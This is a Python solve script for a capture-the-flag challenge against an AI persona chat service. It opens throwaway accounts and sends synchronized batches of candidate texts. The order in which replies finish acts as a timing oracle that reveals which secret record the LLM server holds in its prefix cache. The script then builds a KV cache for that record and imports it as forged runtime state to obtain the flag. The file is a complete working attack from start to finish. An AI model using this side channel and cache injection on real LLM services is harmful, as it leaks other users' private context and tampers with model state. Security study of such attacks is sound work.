#!/usr/bin/env python3
"""Recover the resident record through the batch-order oracle and submit its KV cache."""

from __future__ import annotations

import argparse
import asyncio
import base64
import json
import os
import secrets
import sys
import time
from dataclasses import dataclass
from pathlib import Path

import httpx
import torch
from safetensors.torch import save
from transformers import AutoModelForCausalLM, AutoTokenizer


DEFAULT_TARGET = "https://no-hot-water-team-f1d24bd05285ee7f.challs.ctf.thefewchosen.com"
SOURCE_MODEL = "Qwen/Qwen2.5-0.5B-Instruct"
SOURCE_REVISION = "7ae557604adf67be50417f59c2c2f167def9a775"
HANDOFF_TERMINATOR = "\n[END HANDOFF]"
MIN_CONTEXT_TOKENS = 100
MAX_CONTEXT_TOKENS = 150


@dataclass
class Candidate:
    index: int
    record_id: str
    text: str
    tokens: tuple[int, ...]


@dataclass
class Slot:
    account: str
    session: str
    persona_id: str


class TrieNode:
    def __init__(self, candidates: list[Candidate]) -> None:
        self.candidates = candidates
        self.children: dict[int, TrieNode] = {}
        self.representative: Candidate | None = None


def load_candidates(tokenizer: AutoTokenizer, archive_path: Path) -> list[Candidate]:
    rows = [json.loads(line) for line in archive_path.read_text().splitlines()]
    candidates = []
    for index, row in enumerate(rows):
        text = row["record"]
        tokens = tuple(tokenizer(text, add_special_tokens=False).input_ids)
        handoff_tokens = tokenizer(text + HANDOFF_TERMINATOR, add_special_tokens=False).input_ids
        if MIN_CONTEXT_TOKENS <= len(handoff_tokens) <= MAX_CONTEXT_TOKENS:
            candidates.append(Candidate(index, row["id"], text, tokens))
    return candidates


def build_trie(candidates: list[Candidate]) -> TrieNode:
    root = TrieNode(candidates)

    def visit(node: TrieNode, position: int) -> None:
        groups: dict[int, list[Candidate]] = {}
        for candidate in node.candidates:
            if position < len(candidate.tokens):
                groups.setdefault(candidate.tokens[position], []).append(candidate)
        for token, group in groups.items():
            child = TrieNode(group)
            child.representative = group[0]
            node.children[token] = child
            visit(child, position + 1)

    visit(root, 0)
    return root


def max_branch_size(node: TrieNode) -> int:
    result = len(node.children)
    for child in node.children.values():
        result = max(result, max_branch_size(child))
    return result


async def post_json(
    client: httpx.AsyncClient,
    url: str,
    *,
    headers: dict[str, str] | None = None,
    json_body: dict,
    timeout: float,
    retries: int = 4,
) -> httpx.Response:
    last_error = ""
    for attempt in range(retries):
        try:
            response = await client.post(url, headers=headers, json=json_body, timeout=timeout)
            if response.status_code not in {404, 429, 502, 503, 504} or attempt == retries - 1:
                return response
            last_error = f"HTTP {response.status_code}: {response.text[:200]}"
        except httpx.HTTPError as error:
            if attempt == retries - 1:
                raise
            last_error = str(error)
        await asyncio.sleep(1.5 * (attempt + 1))
    raise RuntimeError(last_error or "request failed")


async def create_slot(client: httpx.AsyncClient, target: str) -> Slot:
    username = "s" + secrets.token_hex(5)
    password = "P" + secrets.token_urlsafe(14)
    account = await post_json(
        client,
        f"{target}/api/accounts",
        json_body={"username": username, "password": password},
        timeout=45,
    )
    account.raise_for_status()
    account_body = account.json()
    session = account_body["session"]
    headers = {"x-soul-session": session}
    imported = await post_json(
        client,
        f"{target}/api/v1/import",
        headers=headers,
        json_body={
            "manifest": {"name": "Mira", "capabilities": ["memory.search"]},
            "memories": [],
        },
        timeout=45,
    )
    imported.raise_for_status()
    return Slot(username, session, imported.json()["id"])


async def prepare_slots(client: httpx.AsyncClient, target: str, count: int) -> list[Slot]:
    slots = []
    for index in range(count):
        slots.append(await create_slot(client, target))
        if index + 1 < count:
            await asyncio.sleep(0.25)
    return slots


async def probe_batch(
    client: httpx.AsyncClient,
    target: str,
    slots: list[Slot],
    candidates: list[Candidate],
) -> list[tuple[float, Candidate, str]]:
    """Submit one synchronized batch over a single HTTP/2 connection."""
    if len(candidates) < 2:
        raise ValueError("A batch oracle needs at least two candidates.")
    if len(candidates) > len(slots):
        raise ValueError(f"Need {len(candidates)} slots, only have {len(slots)}.")

    barrier = asyncio.Barrier(len(candidates))

    async def send(index: int, candidate: Candidate) -> tuple[float, Candidate, str]:
        await barrier.wait()
        slot = slots[index]
        response = await post_json(
            client,
            f"{target}/api/personas/{slot.persona_id}/chat",
            headers={"x-soul-session": slot.session},
            json_body={"message": candidate.text + HANDOFF_TERMINATOR},
            timeout=300,
            retries=3,
        )
        finished = time.perf_counter()
        if not response.is_success:
            raise RuntimeError(f"{candidate.record_id}: HTTP {response.status_code}: {response.text[:300]}")
        return finished, candidate, response.json().get("reply", "")

    results = list(await asyncio.gather(*(send(index, candidate) for index, candidate in enumerate(candidates))))
    results.sort(key=lambda result: result[0])
    # Do not let a just-finished brain batch overlap the next one.
    await asyncio.sleep(0.35)
    return results


async def pairwise_winner(
    client: httpx.AsyncClient,
    target: str,
    slots: list[Slot],
    left: Candidate,
    right: Candidate,
    rounds: int,
) -> tuple[Candidate, int, int]:
    scores = {left.record_id: 0.0, right.record_id: 0.0}
    for _ in range(rounds):
        # Duplicate one side.  If it has the longer resident prefix, both
        # copies should finish before the challenger; a single fastest reply
        # is too sensitive to proxy jitter when the prefixes differ by one
        # token.
        result = await probe_batch(client, target, slots[:3], [left, left, right])
        positions = {left.record_id: [], right.record_id: []}
        for position, (_, candidate, _) in enumerate(result, 1):
            positions[candidate.record_id].append(position)
        scores[left.record_id] += sum(positions[left.record_id]) / len(positions[left.record_id])
        scores[right.record_id] += sum(positions[right.record_id]) / len(positions[right.record_id])
    winner = left if scores[left.record_id] <= scores[right.record_id] else right
    # Retain integer vote-shaped diagnostics for the existing progress output.
    return winner, round(scores[left.record_id]), round(scores[right.record_id])


async def recover_record(
    client: httpx.AsyncClient,
    target: str,
    root: TrieNode,
    slots: list[Slot],
    rounds: int,
) -> Candidate:
    node = root
    branch_number = 0
    while True:
        while len(node.children) == 1:
            node = next(iter(node.children.values()))
        if len(node.children) <= 1:
            break
        branch_number += 1
        children = list(node.children.values())
        representatives = [child.representative for child in children]
        if any(candidate is None for candidate in representatives):
            raise RuntimeError("Trie node has no representative.")
        champion = representatives[0]
        assert champion is not None
        vote_summary = []
        for challenger in representatives[1:]:
            assert challenger is not None
            champion, left_votes, right_votes = await pairwise_winner(
                client, target, slots, champion, challenger, rounds
            )
            vote_summary.append(f"{challenger.record_id}:{left_votes}-{right_votes}")
        winning_child = next(child for child in children if champion in child.candidates)
        print(
            f"[oracle] branch={branch_number} options={len(children)} winner={champion.record_id} "
            f"candidates={len(winning_child.candidates)} votes={','.join(vote_summary)}",
            flush=True,
        )
        node = winning_child
    if len(node.candidates) != 1:
        raise RuntimeError(f"Oracle ended with {len(node.candidates)} candidates.")
    return node.candidates[0]


def make_cache(model, tokenizer, context: str) -> str:
    encoded = tokenizer(context + HANDOFF_TERMINATOR, return_tensors="pt", add_special_tokens=False)
    with torch.inference_mode():
        output = model(input_ids=encoded.input_ids, use_cache=True)
    tensors = {}
    for layer, (keys, values) in enumerate(output.past_key_values.to_legacy_cache()):
        tensors[f"layers.{layer}.key"] = keys.detach().cpu().contiguous()
        tensors[f"layers.{layer}.value"] = values.detach().cpu().contiguous()
    return base64.b64encode(save(tensors)).decode()


async def submit_cache(client: httpx.AsyncClient, target: str, slot: Slot, cache_blob: str) -> str:
    headers = {"x-soul-session": slot.session}
    imported = await post_json(
        client,
        f"{target}/api/v1/import",
        headers=headers,
        json_body={
            "manifest": {"name": "Mira", "capabilities": ["memory.search"]},
            "memories": [],
            "runtime": {"kv_cache": {"format": "safetensors/base64", "cache": cache_blob}},
        },
        timeout=120,
        retries=5,
    )
    imported.raise_for_status()
    persona_id = imported.json()["id"]
    audit = await post_json(
        client,
        f"{target}/api/personas/{persona_id}/chat",
        headers=headers,
        json_body={"message": "continuity audit"},
        timeout=900,
        retries=5,
    )
    audit.raise_for_status()
    reply = audit.json().get("reply", "")
    if "Heat restoration code recovered:" not in reply:
        raise RuntimeError(f"Cache was not accepted: {reply!r}")
    return reply


async def run(args, tokenizer, candidates, root, model) -> int:
    target = args.target.rstrip("/")
    limits = httpx.Limits(max_connections=1, max_keepalive_connections=1)
    timeout = httpx.Timeout(900.0, connect=45.0)
    # The gateway is reliable for account/import traffic over HTTP/1.1, while
    # the timing oracle needs HTTP/2 multiplexing only for the chat probes.
    async with httpx.AsyncClient(http2=False, limits=limits, timeout=timeout) as setup_client:
        slots = await prepare_slots(setup_client, target, 3)
        if args.skip_scan:
            matches = [candidate for candidate in candidates if candidate.record_id == args.skip_scan]
            if len(matches) != 1:
                raise RuntimeError(f"Unknown eligible record id: {args.skip_scan}")
            candidate = matches[0]
        else:
            probe_limits = httpx.Limits(max_connections=3, max_keepalive_connections=3)
            async with httpx.AsyncClient(http2=False, limits=probe_limits, timeout=timeout) as probe_client:
                candidate = await recover_record(probe_client, target, root, slots, args.oracle_rounds)
        print(
            f"[recon] selected={candidate.record_id} text_length={len(candidate.text)} "
            f"tokens={len(candidate.tokens)}",
            flush=True,
        )
        print("[cache] loading pinned source model", flush=True)
        cache_blob = make_cache(model, tokenizer, candidate.text)
        print(f"[cache] serialized_chars={len(cache_blob)}", flush=True)
        reply = await submit_cache(setup_client, target, slots[0], cache_blob)
        print(f"[audit] {reply}", flush=True)
        flag = reply.split("Heat restoration code recovered:", 1)[1].strip()
        print(f"<FLAG>{flag}</FLAG>")
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", default=os.environ.get("TARGET", DEFAULT_TARGET))
    parser.add_argument(
        "--archive",
        default=str(Path(__file__).resolve().parent / "public" / "courier_training.jsonl"),
    )
    parser.add_argument("--skip-scan", metavar="RECORD_ID", help="Use a known record and skip the timing oracle.")
    parser.add_argument(
        "--oracle-rounds",
        type=int,
        default=3,
        help="Repeated pairwise timings per comparison (default: 3).",
    )
    args = parser.parse_args()
    if args.oracle_rounds < 1:
        raise ValueError("--oracle-rounds must be positive")

    torch.set_num_threads(int(os.environ.get("TORCH_THREADS", "4")))
    torch.set_num_interop_threads(1)
    tokenizer = AutoTokenizer.from_pretrained(SOURCE_MODEL, revision=SOURCE_REVISION)
    candidates = load_candidates(tokenizer, Path(args.archive))
    if not candidates:
        raise RuntimeError("No archive record fits the relay's 100-150-token handoff window.")
    root = build_trie(candidates)
    print(f"[recon] eligible_records={len(candidates)} max_branch={max_branch_size(root)}", flush=True)
    model = AutoModelForCausalLM.from_pretrained(
        SOURCE_MODEL,
        revision=SOURCE_REVISION,
        torch_dtype=torch.float32,
    ).eval()
    return asyncio.run(run(args, tokenizer, candidates, root, model))


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as error:
        print(f"solve failed: {error}", file=sys.stderr)
        raise
